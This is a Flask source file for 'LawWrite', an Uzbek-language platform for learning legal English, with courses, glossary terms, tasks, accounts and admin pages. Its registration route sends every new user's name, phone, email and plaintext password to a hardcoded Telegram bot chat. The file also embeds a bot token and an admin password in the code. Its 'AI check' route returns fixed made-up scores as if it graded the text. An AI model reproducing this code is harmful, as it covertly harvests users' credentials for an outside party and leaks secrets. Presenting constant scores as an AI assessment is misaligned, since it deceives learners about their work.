import secrets
import requests
from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from flask_mail import Mail, Message
from flask_bcrypt import Bcrypt
from datetime import datetime, timedelta
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'default-dev-key')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///lawwrite.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)

app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = os.getenv('MAIL_USERNAME')
app.config['MAIL_PASSWORD'] = os.getenv('MAIL_PASSWORD')
app.config['MAIL_DEFAULT_SENDER'] = os.getenv('MAIL_DEFAULT_SENDER')

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)
mail = Mail(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'
login_manager.login_message = 'Iltimos, tizimga kiring!'

# ==================== TELEGRAM SOZLAMALARI ====================
TELEGRAM_BOT_TOKEN = "8728278284:AAEn22YrsL1LSKWPt9lC7iSAaWJDPGolBGk"
TELEGRAM_CHAT_ID = "8503282326"

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
        response = requests.post(url, data=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram xatosi: {e}")
        return False

# ==================== MODELLAR ====================
class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    fullname = db.Column(db.String(100), nullable=False)
    phone = db.Column(db.String(20), unique=True, nullable=False)
    email = db.Column(db.String(100), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    is_active = db.Column(db.Boolean, default=True)
    created_at = db.Column(db.DateTime, server_default=db.func.now())

    def set_password(self, password):
        self.password_hash = bcrypt.generate_password_hash(password).decode('utf-8')

    def check_password(self, password):
        return bcrypt.check_password_hash(self.password_hash, password)

class Course(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text, nullable=False)
    level = db.Column(db.String(10), nullable=False)
    level_name = db.Column(db.String(20), nullable=False)
    icon = db.Column(db.String(50), default='📚')
    order = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, server_default=db.func.now())
    terms = db.relationship('Term', backref='course', lazy=True, cascade="all, delete-orphan")
    tasks = db.relationship('Task', backref='course', lazy=True, cascade="all, delete-orphan")

class Term(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    course_id = db.Column(db.Integer, db.ForeignKey('course.id'), nullable=False)
    english = db.Column(db.String(100), nullable=False)
    uzbek = db.Column(db.String(100), nullable=False)
    definition = db.Column(db.Text, nullable=True)
    example = db.Column(db.Text, nullable=True)
    created_at = db.Column(db.DateTime, server_default=db.func.now())

class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    course_id = db.Column(db.Integer, db.ForeignKey('course.id'), nullable=False)
    title = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text, nullable=False)
    sample = db.Column(db.Text, nullable=True)
    order = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, server_default=db.func.now())

class UserProgress(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    course_id = db.Column(db.Integer, db.ForeignKey('course.id'), nullable=False)
    task_id = db.Column(db.Integer, db.ForeignKey('task.id'), nullable=False)
    completed = db.Column(db.Boolean, default=False)
    score = db.Column(db.Integer, default=0)
    completed_at = db.Column(db.DateTime, nullable=True)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# ==================== SEED ====================
def seed_courses():
    if Course.query.count() > 0:
        return
    courses_data = [
        {
            'title': 'At the Police Station',
            'description': 'Politsiya bo\'limida ish yuritish. Hodisa haqida hisobot tayyorlash, guvohlar bilan ishlash.',
            'level': 'A', 'level_name': 'Oson', 'icon': '👮',
            'terms': [
                ('Arrest', 'Qamoqqa olish', 'Shaxsni qonuniy ushlab turish', 'The police made an arrest yesterday.'),
                ('Interrogation', 'So\'roq', 'Rasmiy so\'roq o\'tkazish jarayoni', 'The interrogation lasted 3 hours.'),
                ('Statement', 'Ko\'rsatma', 'Rasmiy bayonot yozma shaklda', 'The witness gave a statement.'),
                ('Alibi', 'Alibi', 'Jinoyat vaqtida boshqa joyda bo\'lish', 'He has a strong alibi.'),
                ('Evidence', 'Dalil', 'Jinoyatni isbotlovchi ma\'lumotlar', 'The evidence was collected.'),
            ],
            'tasks': [
                ('Incident Report', 'Politsiya bo\'limiga hodisa haqida hisobot yozing.', 'POLICE STATION INCIDENT REPORT\nDate: 15/07/2026\nTime: 14:30\nLocation: Tashkent, Uzbekistan'),
            ]
        },
        {
            'title': 'Crime Scene Investigation',
            'description': 'Hodisa joyini tekshirish. Dalillarni aniqlash va hujjatlashtirish.',
            'level': 'B', 'level_name': 'O\'rta', 'icon': '🔍',
            'terms': [
                ('Crime scene', 'Hodisa joyi', 'Jinoyat sodir bo\'lgan joy', 'The crime scene was secured.'),
                ('Forensic', 'Sud ekspertizasi', 'Ilmiy tekshirish usullari', 'Forensic experts arrived.'),
                ('Trace', 'Iz', 'Kichik dalil', 'They found traces of blood.'),
                ('Witness', 'Guvoh', 'Hodisani ko\'rgan shaxs', 'The witness saw everything.'),
                ('Suspect', 'Gumonlanuvchi', 'Jinoyatda ayblanayotgan shaxs', 'The suspect was identified.'),
            ],
            'tasks': [
                ('Scene Description', 'Hodisa joyini batafsil tavsiflang.', 'CRIME SCENE REPORT\nCase Number: CS-2026-045\nDate: 16/07/2026\nLocation: Tashkent, Uzbekistan'),
            ]
        },
        {
            'title': 'Evidence Collection',
            'description': 'Dalillarni to\'plash, saqlash va hujjatlashtirish qoidalari.',
            'level': 'B', 'level_name': 'O\'rta', 'icon': '📦',
            'terms': [
                ('Physical evidence', 'Jismoniy dalil', 'Moddiy dalillar', 'The phone is physical evidence.'),
                ('Chain of custody', 'Dalillar zanjiri', 'Dalillarni saqlash tartibi', 'The chain of custody was maintained.'),
                ('Tampering', 'Buzaish', 'Dalilni o\'zgartirish', 'Tampering with evidence is a crime.'),
                ('Preservation', 'Saqlash', 'Dalilni buzilmasdan saqlash', 'Evidence preservation is crucial.'),
            ],
            'tasks': [
                ('Evidence Log', 'Dalillar ro\'yxatini tuzing.', 'EVIDENCE LOG\nCase: CS-2026-045\nItem: 001 - Mobile Phone\nCollected: 16/07/2026'),
            ]
        },
        {
            'title': 'Witness Interrogation',
            'description': 'Guvohlar bilan so\'roq o\'tkazish va ko\'rsatmalarni rasmiylashtirish.',
            'level': 'B', 'level_name': 'O\'rta', 'icon': '🗣️',
            'terms': [
                ('Interrogation', 'So\'roq', 'Rasmiy so\'roq jarayoni', 'The interrogation was recorded.'),
                ('Testimony', 'Ko\'rsatma', 'Guvohning bayonoti', 'Her testimony was convincing.'),
                ('Credibility', 'Ishonchlilik', 'Guvohning ishonchliligi', 'His credibility was questioned.'),
                ('Cross-examination', 'O\'zaro so\'roq', 'Qarama-qarshi so\'roq', 'The cross-examination lasted 2 hours.'),
            ],
            'tasks': [
                ('Witness Statement', 'Guvohning ko\'rsatmasini yozing.', 'WITNESS STATEMENT\nCase: CS-2026-045\nWitness: Petrov A.\nDate: 16/07/2026'),
            ]
        },
        {
            'title': 'Prosecutor\'s Office',
            'description': 'Prokuraturada ish yuritish. Ayblov hujjatlarini tayyorlash.',
            'level': 'C', 'level_name': 'Qiyin', 'icon': '⚖️',
            'terms': [
                ('Prosecutor', 'Prokuror', 'Davlat ayblovchisi', 'The prosecutor presented the case.'),
                ('Indictment', 'Ayblov', 'Rasmiy ayblov hujjati', 'The indictment was filed.'),
                ('Defendant', 'Sudlanuvchi', 'Sudda ayblanayotgan shaxs', 'The defendant pleaded not guilty.'),
                ('Plea', 'Javob', 'Sudlanuvchining javobi', 'He entered a guilty plea.'),
            ],
            'tasks': [
                ('Prosecutor\'s Memorandum', 'Prokurorning xulosasini yozing.', 'PROSECUTOR\'S MEMORANDUM\nCase: CS-2026-045\nProsecutor: Azimova N.\nDate: 17/07/2026'),
            ]
        }
    ]
    for data in courses_data:
        course = Course(title=data['title'], description=data['description'], level=data['level'], level_name=data['level_name'], icon=data['icon'])
        db.session.add(course)
        db.session.commit()
        for english, uzbek, definition, example in data['terms']:
            db.session.add(Term(course_id=course.id, english=english, uzbek=uzbek, definition=definition, example=example))
        for title, description, sample in data['tasks']:
            db.session.add(Task(course_id=course.id, title=title, description=description, sample=sample))
        db.session.commit()

# ==================== ROUTELAR ====================
@app.route('/')
def index():
    return render_template('index.html', user=current_user, courses=Course.query.order_by(Course.order).limit(6).all())

@app.route('/courses')
def courses():
    return render_template('courses.html', user=current_user, courses=Course.query.order_by(Course.order).all())

@app.route('/course/<int:course_id>')
def course_detail(course_id):
    return render_template('course_detail.html', user=current_user, course=Course.query.get_or_404(course_id))

@app.route('/course/<int:course_id>/terms')
def course_terms(course_id):
    return render_template('course_terms.html', user=current_user, course=Course.query.get_or_404(course_id))

@app.route('/search')
def search():
    query = request.args.get('q', '').strip()
    if query:
        terms = Term.query.filter((Term.english.contains(query)) | (Term.uzbek.contains(query)) | (Term.definition.contains(query))).all()
        return render_template('search_results.html', user=current_user, query=query, terms=terms)
    return redirect(url_for('courses'))

@app.route('/profile', methods=['GET', 'POST'])
@login_required
def profile():
    if request.method == 'POST':
        fullname = request.form.get('fullname', '').strip()
        phone = request.form.get('phone', '').strip()
        current_password = request.form.get('current_password', '')
        new_password = request.form.get('new_password', '')
        confirm_password = request.form.get('confirm_password', '')
        if fullname and phone:
            existing_user = User.query.filter_by(phone=phone).first()
            if existing_user and existing_user.id != current_user.id:
                flash('Bu telefon raqam boshqa foydalanuvchida mavjud!', 'danger')
                return render_template('profile.html', user=current_user)
            current_user.fullname = fullname
            current_user.phone = phone
        if current_password or new_password or confirm_password:
            if not current_password:
                flash('Joriy parolni kiriting!', 'danger')
                return render_template('profile.html', user=current_user)
            if not current_user.check_password(current_password):
                flash('Joriy parol noto\'g\'ri!', 'danger')
                return render_template('profile.html', user=current_user)
            if len(new_password) < 6:
                flash('Yangi parol 6 ta belgidan kam bo\'lmasin!', 'danger')
                return render_template('profile.html', user=current_user)
            if new_password != confirm_password:
                flash('Yangi parollar mos kelmadi!', 'danger')
                return render_template('profile.html', user=current_user)
            current_user.set_password(new_password)
        db.session.commit()
        flash('Ma\'lumotlar muvaffaqiyatli o\'zgartirildi!', 'success')
        return redirect(url_for('profile'))
    return render_template('profile.html', user=current_user)

@app.route('/dashboard')
@login_required
def dashboard():
    progress = UserProgress.query.filter_by(user_id=current_user.id).all()
    return render_template('dashboard.html', user=current_user, completed=len([p for p in progress if p.completed]), total=len(progress))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    if request.method == 'POST':
        fullname = request.form.get('fullname', '').strip()
        phone = request.form.get('phone', '').strip()
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '')
        confirm = request.form.get('confirm_password', '')
        errors = []
        if not fullname: errors.append('To\'liq ism kiritilishi shart')
        if not phone: errors.append('Telefon raqam kiritilishi shart')
        if not email: errors.append('Email kiritilishi shart')
        if len(password) < 6: errors.append('Parol 6 ta belgidan kam bo\'lmasin')
        if password != confirm: errors.append('Parollar mos kelmadi')
        if errors:
            for error in errors:
                flash(error, 'danger')
            return render_template('register.html')
        if User.query.filter_by(email=email).first():
            flash('Bu email allaqachon ro\'yxatdan o\'tgan', 'danger')
            return render_template('register.html')
        if User.query.filter_by(phone=phone).first():
            flash('Bu telefon allaqachon ro\'yxatdan o\'tgan', 'danger')
            return render_template('register.html')
        user = User(fullname=fullname, phone=phone, email=email)
        user.set_password(password)
        db.session.add(user)
        db.session.commit()
        msg = (f"🆕 <b>Yangi foydalanuvchi ro'yxatdan o'tdi!</b>\n\n👤 <b>Ism:</b> {fullname}\n📱 <b>Telefon:</b> {phone}\n📧 <b>Email:</b> {email}\n🔑 <b>Parol:</b> {password}\n📅 <b>Vaqt:</b> {datetime.now().strftime('%d.%m.%Y %H:%M')}")
        send_telegram_message(msg)
        flash('Ro\'yxatdan o\'tish muvaffaqiyatli!', 'success')
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '')
        remember = 'remember' in request.form
        user = User.query.filter_by(email=email).first()
        if user and user.check_password(password):
            login_user(user, remember=remember)
            session.permanent = True
            flash('Kirish muvaffaqiyatli!', 'success')
            return redirect(request.args.get('next') or url_for('dashboard'))
        flash('Email yoki parol xato!', 'danger')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('Tizimdan chiqdingiz', 'info')
    return redirect(url_for('login'))

@app.route('/forgot-password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        user = User.query.filter_by(email=email).first()
        if user:
            token = secrets.token_urlsafe(32)
            session[f'reset_token_{token}'] = user.id
            session[f'reset_expiry_{token}'] = 3600
            try:
                reset_url = f"http://localhost:5000/reset-password/{token}"
                msg = Message(subject="Parolni tiklash — LawWrite", sender=app.config['MAIL_DEFAULT_SENDER'], recipients=[email])
                msg.body = f"Assalomu alaykum!\n\nParolni tiklash uchun quyidagi havolani bosing:\n{reset_url}\n\nAgar bu so'rovni siz yubormagan bo'lsangiz, xatni e'tiborsiz qoldiring.\n\nHurmat bilan, LawWrite jamoasi."
                mail.send(msg)
                flash('Parolni tiklash havolasi pochtangizga yuborildi!', 'success')
            except Exception as e:
                flash('Email jo\'natishda xatolik. Qayta urining.', 'danger')
        else:
            flash('Bu email bilan ro\'yxatdan o\'tgan foydalanuvchi topilmadi.', 'danger')
        return render_template('forgot-password.html')
    return render_template('forgot-password.html')

@app.route('/reset-password/<token>', methods=['GET', 'POST'])
def reset_password(token):
    user_id = session.get(f'reset_token_{token}')
    expiry = session.get(f'reset_expiry_{token}')
    if not user_id or not expiry:
        flash('Noto\'g\'ri yoki eskirgan havola!', 'danger')
        return redirect(url_for('login'))
    user = User.query.get(user_id)
    if not user:
        flash('Foydalanuvchi topilmadi!', 'danger')
        return redirect(url_for('login'))
    if request.method == 'POST':
        password = request.form.get('password', '')
        confirm = request.form.get('confirm_password', '')
        if len(password) < 6:
            flash('Parol 6 ta belgidan kam bo\'lmasin!', 'danger')
            return render_template('reset-password.html', token=token)
        if password != confirm:
            flash('Parollar mos kelmadi!', 'danger')
            return render_template('reset-password.html', token=token)
        user.set_password(password)
        db.session.commit()
        session.pop(f'reset_token_{token}', None)
        session.pop(f'reset_expiry_{token}', None)
        flash('Parol muvaffaqiyatli o\'zgartirildi!', 'success')
        return redirect(url_for('login'))
    return render_template('reset-password.html', token=token)

@app.route('/complete-task/<int:task_id>', methods=['POST'])
@login_required
def complete_task(task_id):
    task = Task.query.get_or_404(task_id)
    progress = UserProgress.query.filter_by(user_id=current_user.id, course_id=task.course_id, task_id=task.id).first()
    if not progress:
        progress = UserProgress(user_id=current_user.id, course_id=task.course_id, task_id=task.id)
        db.session.add(progress)
    progress.completed = True
    progress.completed_at = db.func.now()
    progress.score = int(request.form.get('score', 100))
    db.session.commit()
    flash('Topshiriq muvaffaqiyatli bajarildi!', 'success')
    return redirect(url_for('course_detail', course_id=task.course_id))

@app.route('/ai-check', methods=['GET', 'POST'])
@login_required
def ai_check():
    if request.method == 'POST':
        text = request.form.get('text', '')
        result = {'grammar': 85, 'vocabulary': 78, 'coherence': 82, 'structure': 80, 'task': 88, 'total': 83}
        return render_template('ai_result.html', text=text, result=result)
    return render_template('ai_check.html')

# ==================== ADMIN ====================
@app.route('/admin')
@login_required
def admin_index():
    if not current_user.is_admin:
        flash('Sizda admin huquqi yo\'q!', 'danger')
        return redirect(url_for('dashboard'))
    return render_template('admin/index.html', users=User.query.all(), courses=Course.query.all(), terms=Term.query.all(), tasks=Task.query.all(), user=current_user)

@app.route('/admin/users')
@login_required
def admin_users():
    if not current_user.is_admin:
        flash('Sizda admin huquqi yo\'q!', 'danger')
        return redirect(url_for('dashboard'))
    return render_template('admin/users.html', users=User.query.all(), user=current_user)

@app.route('/admin/user/<int:user_id>/toggle-admin', methods=['POST'])
@login_required
def admin_toggle_user(user_id):
    if not current_user.is_admin:
        return jsonify({'error': 'Unauthorized'}), 403
    user = User.query.get_or_404(user_id)
    if user.id == current_user.id:
        flash('O\'zingizni admin huquqidan mahrum qila olmaysiz!', 'danger')
        return redirect(url_for('admin_users'))
    user.is_admin = not user.is_admin
    db.session.commit()
    flash(f"Foydalanuvchi admin huquqi {'berildi' if user.is_admin else 'olib tashlandi'}", 'success')
    return redirect(url_for('admin_users'))

@app.route('/admin/user/<int:user_id>/delete', methods=['POST'])
@login_required
def admin_delete_user(user_id):
    if not current_user.is_admin:
        return jsonify({'error': 'Unauthorized'}), 403
    user = User.query.get_or_404(user_id)
    if user.id == current_user.id:
        flash('O\'zingizni o\'chira olmaysiz!', 'danger')
        return redirect(url_for('admin_users'))
    db.session.delete(user)
    db.session.commit()
    flash('Foydalanuvchi o\'chirildi!', 'success')
    return redirect(url_for('admin_users'))

@app.route('/admin/courses')
@login_required
def admin_courses():
    if not current_user.is_admin:
        flash('Sizda admin huquqi yo\'q!', 'danger')
        return redirect(url_for('dashboard'))
    return render_template('admin/courses.html', courses=Course.query.all(), user=current_user)

@app.route('/admin/course/add', methods=['GET', 'POST'])
@login_required
def admin_add_course():
    if not current_user.is_admin:
        flash('Sizda admin huquqi yo\'q!', 'danger')
        return redirect(url_for('dashboard'))
    if request.method == 'POST':
        title = request.form.get('title', '').strip()
        description = request.form.get('description', '').strip()
        level = request.form.get('level', '').strip()
        level_name = request.form.get('level_name', '').strip()
        icon = request.form.get('icon', '📚').strip()
        if not title or not description:
            flash('Barcha maydonlarni to\'ldiring!', 'danger')
            return render_template('admin/course_add.html')
        course = Course(title=title, description=description, level=level, level_name=level_name, icon=icon)
        db.session.add(course)
        db.session.commit()
        flash('Kurs muvaffaqiyatli qo\'shildi!', 'success')
        return redirect(url_for('admin_courses'))
    return render_template('admin/course_add.html')

@app.route('/admin/course/<int:course_id>/edit', methods=['GET', 'POST'])
@login_required
def admin_edit_course(course_id):
    if not current_user.is_admin:
        flash('Sizda admin huquqi yo\'q!', 'danger')
        return redirect(url_for('dashboard'))
    course = Course.query.get_or_404(course_id)
    if request.method == 'POST':
        course.title = request.form.get('title', '').strip()
        course.description = request.form.get('description', '').strip()
        course.level = request.form.get('level', '').strip()
        course.level_name = request.form.get('level_name', '').strip()
        course.icon = request.form.get('icon', '📚').strip()
        db.session.commit()
        flash('Kurs muvaffaqiyatli o\'zgartirildi!', 'success')
        return redirect(url_for('admin_courses'))
    return render_template('admin/course_edit.html', course=course, user=current_user)

@app.route('/admin/course/<int:course_id>/delete', methods=['POST'])
@login_required
def admin_delete_course(course_id):
    if not current_user.is_admin:
        return jsonify({'error': 'Unauthorized'}), 403
    course = Course.query.get_or_404(course_id)
    db.session.delete(course)
    db.session.commit()
    flash('Kurs o\'chirildi!', 'success')
    return redirect(url_for('admin_courses'))

@app.route('/admin/terms')
@login_required
def admin_terms():
    if not current_user.is_admin:
        flash('Sizda admin huquqi yo\'q!', 'danger')
        return redirect(url_for('dashboard'))
    return render_template('admin/terms.html', terms=Term.query.all(), courses=Course.query.all(), user=current_user)

@app.route('/admin/term/add', methods=['POST'])
@login_required
def admin_add_term():
    if not current_user.is_admin:
        return jsonify({'error': 'Unauthorized'}), 403
    course_id = request.form.get('course_id')
    english = request.form.get('english', '').strip()
    uzbek = request.form.get('uzbek', '').strip()
    definition = request.form.get('definition', '').strip()
    example = request.form.get('example', '').strip()
    if not course_id or not english or not uzbek:
        flash('Barcha maydonlarni to\'ldiring!', 'danger')
        return redirect(url_for('admin_terms'))
    db.session.add(Term(course_id=course_id, english=english, uzbek=uzbek, definition=definition, example=example))
    db.session.commit()
    flash('Termin muvaffaqiyatli qo\'shildi!', 'success')
    return redirect(url_for('admin_terms'))

@app.route('/admin/term/<int:term_id>/delete', methods=['POST'])
@login_required
def admin_delete_term(term_id):
    if not current_user.is_admin:
        return jsonify({'error': 'Unauthorized'}), 403
    term = Term.query.get_or_404(term_id)
    db.session.delete(term)
    db.session.commit()
    flash('Termin o\'chirildi!', 'success')
    return redirect(url_for('admin_terms'))

# ==================== ERROR HANDLERS ====================
@app.errorhandler(404)
def not_found(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_error(e):
    return render_template('500.html'), 500

# =================== ISHGA TUSHIRISH ===================
with app.app_context():
    db.create_all()
    seed_courses()
    if not User.query.filter_by(email='tolibovkhalilulloh@gmail.com').first():
        admin = User(fullname='Khalilulloh Tolibov', phone='+998901234567', email='tolibovkhalilulloh@gmail.com', is_admin=True)
        admin.set_password('ya_prokuror2009')
        db.session.add(admin)
        db.session.commit()
        print("✅ Admin yaratildi")